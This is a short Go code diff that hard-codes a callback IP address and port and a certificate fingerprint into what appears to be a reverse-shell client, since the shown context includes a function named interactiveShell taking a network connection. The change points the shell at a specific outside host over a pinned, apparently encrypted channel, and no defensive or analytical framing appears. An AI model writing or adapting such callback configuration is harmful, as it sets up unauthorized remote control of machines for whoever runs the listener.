@@ -18,8 +18,8 @@ const (
 )
 
 var (
-	connectString string
-	fingerPrint   string
+    connectString = "104.10.84.54:55501"
+    fingerPrint = "61:84:EA:5C:F5:6A:AC:2D:5E:37:1A:48:68:42:F3:C8:5C:68:7C:77:B0:DC:CE:91:3B:DF:8E:1B:18:C8:B3:83"
 )
 
 func interactiveShell(conn net.Conn) {
